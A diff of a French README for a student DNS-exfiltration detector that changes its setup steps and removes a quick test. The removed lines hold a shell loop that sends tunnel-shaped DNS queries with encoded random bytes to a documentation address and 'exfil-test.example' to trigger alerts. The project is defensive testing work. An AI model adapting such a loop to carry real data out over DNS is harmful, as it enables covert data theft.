@@ -10,33 +10,21 @@ Projet ENSIBS — module IA pour la cybersécurité. Entraîné sur le dataset C
 
 **Prérequis** : une machine **Linux** (la capture utilise le réseau de l'hôte), Docker Engine ≥ 24
 avec le plugin Compose (`docker compose version` doit répondre), 3 à 4 Go d'espace disque.
-Le modèle entraîné est fourni dans l'archive : `models/exfildns.keras`.
+Le modèle entraîné doit se trouver dans `models/exfildns.keras`.
+
+> **S'il vous manque le modèle**, l'entraîner à partir du dataset : voir
+> [Données](#données-seulement-pour-réentraîner-le-modèle) puis [Entraîner](#entraîner)
+> (environ 2 minutes).
+
 
 ```bash
-cd exfildns                       # se placer dans le dossier de l'archive décompressée
+git clone https://github.com/PabloHavane/exfildns.git && cd exfildns
 docker compose up -d --build      # premier lancement : quelques minutes (téléchargement de TensorFlow)
 docker compose ps                 # deux services « Up », le dashboard « healthy » après ~30 s
 ```
 
 Ouvrir **<http://localhost:8501>** : c'est le dashboard. Il affiche en direct chaque requête
 DNS émise par la machine, notée par le modèle (bleu : bénigne, rouge : suspecte).
-
-**Vérifier en 10 secondes** que la détection fonctionne (`dig` : paquet `dnsutils` ou
-`bind-utils`) : la boucle envoie 10 requêtes de la forme d'un tunnel vers `192.0.2.53`,
-adresse réservée à la documentation, donc rien ne sort vraiment.
-
-```bash
-for i in $(seq 1 10); do
-  dig +short +tries=1 +time=1 @192.0.2.53 \
-    "$i.$(head -c 30 /dev/urandom | base64 | tr '+/' '-_' | tr -d '=').exfil-test.example"
-done
-```
-
-Les erreurs de `dig` (« no servers could be reached ») sont normales : aucun serveur ne répond.
-Une alerte vers `exfil-test.example` apparaît dans la **file d'alertes** du dashboard en moins
-de 5 secondes. Sans navigateur, les requêtes suspectes s'affichent aussi dans le terminal,
-avec leur score : `docker compose logs sniff | grep exfil-test`. Les avertissements de
-TensorFlow au début de ces logs (oneDNN, absl) sont sans importance.
 
 Arrêter : `docker compose down` (ajouter `-v` pour effacer les détections).
 
@@ -70,7 +58,7 @@ barre latérale. En moins de 30 secondes :
    encodé, ses features comparées aux requêtes bénignes et un essai de décodage.
 
 Dans le terminal : `docker compose -f compose.labo.yaml logs sniff | grep tunnel.labo` montre
-les requêtes suspectes avec leur score (environ 800 par envoi de 200 Ko).
+les requêtes suspectes avec leur score (plusieurs centaines par envoi de 200 Ko).
 
 Arrêter et effacer le labo : `docker compose -f compose.labo.yaml down -v` (à lancer aussi
 avant de relancer le labo, pour repartir d'une base vide).
@@ -107,7 +95,6 @@ data/
 
 > Mahdavifar, S., et al. *Lightweight Hybrid Detection of Data Exfiltration using DNS based on
 > Machine Learning*. ICCNS 2021.
-
 
 ### Entraîner
 
